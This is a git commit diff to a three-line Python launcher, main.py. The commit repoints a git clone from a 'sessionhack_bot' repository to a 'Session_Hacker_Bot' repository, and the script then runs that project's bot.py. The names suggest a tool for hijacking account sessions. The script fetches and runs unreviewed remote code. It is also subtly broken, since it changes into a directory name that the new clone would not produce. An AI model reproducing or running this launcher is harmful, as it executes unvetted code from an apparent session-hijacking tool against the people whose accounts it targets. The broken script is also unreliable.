b972458fe561f626cde2088ebb53b6bda91fcf45
BEASTUSERBOT <95837974+BEASTUSERBOT@users.noreply.github.com>
2022-01-04 11:12:31 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,3 +1,3 @@
 import os
-os.system("git clone https://github.com/LEGENDXOP/sessionhack_bot")
+os.system("git clone https://github.com/BEASTUSERBOT/Session_Hacker_Bot")
 os.system("cd sessionhack_bot && python bot.py")
